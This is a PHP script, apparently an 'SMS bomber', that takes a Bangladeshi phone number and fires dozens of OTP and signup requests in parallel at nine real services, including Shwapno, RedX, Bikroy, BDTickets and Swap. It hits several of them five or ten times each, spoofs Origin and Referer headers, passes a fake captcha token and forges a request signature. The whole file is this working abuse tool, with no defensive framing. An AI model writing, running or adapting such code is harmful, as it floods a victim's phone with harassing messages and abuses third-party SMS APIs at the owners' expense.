<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors',1);

// Validate phone
$phone = $_GET['phone'] ?? '';
if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status"=>"error","message"=>"Invalid phone number. Use 01XXXXXXXXX"]));
}

// Phone normalization
$phone_11 = preg_replace('/^\+?88/', '', $phone);
if(substr($phone_11,0,1)!=="0") $phone_11 = "0".$phone_11;
$phone_88 = "88".$phone_11;
$phone_plus88 = "+88".$phone_11;

// Secret key for Swap API
$swap_secret = "YOUR_SECRET_KEY_HERE";
$swap_timestamp = time();
$swap_signature = base64_encode(hash_hmac('sha256', $phone.$swap_timestamp, $swap_secret, true));

// Prepare API requests
$api_requests = [];

// 1️⃣ Shwapno (5 times) ✅ untouched
for($i=1;$i<=5;$i++){
    $api_requests[] = [
        "name"=>"shwapno_$i",
        "url"=>"https://www.shwapno.com/api/auth",
        "data"=>["phoneNumber"=>$phone_plus88],
        "headers"=>[
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0 (Linux; Android 10)',
            'Origin: https://www.shwapno.com',
            'Referer: https://www.shwapno.com/',
            'Cookie: cuid=98a49521-6662-498f-94eb-17d71974083f; _nc_=true; _ds_=65eb62a4452e887cd78e256b'
        ]
    ];
}

// 2️⃣ Garibook (5 times) ✅ untouched
for($i=1;$i<=5;$i++){
    $api_requests[] = [
        "name"=>"garibook_$i",
        "url"=>"https://api.garibookadmin.com/api/v4/user/login",
        "data"=>["mobile"=>$phone_plus88,"recaptcha_token"=>"garibookcaptcha","channel"=>"web"],
        "headers"=>[
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0 (Linux; Android 10)',
            'Origin: https://garibook.com',
            'Referer: https://garibook.com/'
        ]
    ];
}

// 3️⃣ RedX (10 times) ✅ untouched
for($i=1;$i<=10;$i++){
    $api_requests[] = [
        "name"=>"redx_$i",
        "url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        "data"=>["phoneNumber"=>$phone_11],
        "headers"=>['Content-Type: application/json','User-Agent: Mozilla/5.0']
    ];
}

// 4️⃣ Bikroy (10 times) ✅ untouched GET
for($i=1;$i<=10;$i++){
    $api_requests[] = [
        "name"=>"bikroy_$i",
        "url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11",
        "data"=>[],
        "headers"=>['User-Agent: Mozilla/5.0'],
        "method"=>"GET"
    ];
}

// 5️⃣ BDTickets (10 times) ✅ untouched
for($i=1;$i<=10;$i++){
    $api_requests[] = [
        "name"=>"bdtickets_$i",
        "url"=>"https://api.bdtickets.com:20100/v1/auth",
        "data"=>["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"],
        "headers"=>[
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0',
            'Origin: https://bdtickets.com',
            'Referer: https://bdtickets.com/'
        ]
    ];
}

// 6️⃣ Shikho (1 time min)
$api_requests[] = [
    "name"=>"shikho_1",
    "url"=>"https://api.shikho.com/auth/v2/send/sms",
    "data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],
    "headers"=>[
        'Content-Type: application/json',
        'User-Agent: Mozilla/5.0',
        'Origin: https://shikho.com',
        'Referer: https://shikho.com/'
    ]
];

// 7️⃣ PBS (1 time min)
$api_requests[] = [
    "name"=>"pbs_1",
    "url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP",
    "data"=>["userPhone"=>$phone_11],
    "headers"=>[
        'Content-Type: application/json',
        'User-Agent: Mozilla/5.0',
        'Origin: https://pbs.com.bd'
    ]
];

// 8️⃣ Iqra Live (1 time min)
$api_requests[] = [
    "name"=>"iqra_1",
    "url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp",
    "data"=>["phone"=>$phone_11],
    "headers"=>[
        'Content-Type: application/json',
        'User-Agent: Mozilla/5.0',
        'Origin: https://iqra-live.com'
    ]
];

// 9️⃣ Swap API (10 time min)
for($i=1;$i<=10;$i++){
$api_requests[] = [
    "name"=>"swap_$i",
    "url"=>"https://api.swap.com.bd/api/v1/send-otp/v2",
    "data"=>[
        "phone"=>$phone_plus88,
        "timestamp"=>$swap_timestamp
    ],
    "headers"=>[
        'Content-Type: application/json',
        'User-Agent: Mozilla/5.0 (Linux; Android 10)',
        'Accept: application/json, text/plain, */*',
        'Origin: https://swap.com.bd',
        'Referer: https://swap.com.bd/',
        'signature: '.$swap_signature
    ]
];
}
// Multi-cURL execution
$results = [];
$multiCurl = [];
$mh = curl_multi_init();

foreach($api_requests as $key=>$api){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $api['headers']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 25);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

    if(!isset($api['method']) || $api['method']!=="GET"){
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data']));
    }

    $multiCurl[$key] = $ch;
    curl_multi_add_handle($mh,$ch);
}

// Execute parallel
$running=null;
do{
    curl_multi_exec($mh,$running);
    curl_multi_select($mh);
}while($running>0);

// Collect results
foreach($multiCurl as $key=>$ch){
    $res = curl_multi_getcontent($ch);
    $error = curl_error($ch);
    $http = curl_getinfo($ch,CURLINFO_HTTP_CODE);
    $results[$api_requests[$key]['name']] = [
        "status_code"=>$http,
        "error"=>$error ?: null,
        "response"=>$res
    ];
    curl_multi_remove_handle($mh,$ch);
    curl_close($ch);
}

curl_multi_close($mh);

echo json_encode(["status"=>"completed","results"=>$results], JSON_PRETTY_PRINT);
?>
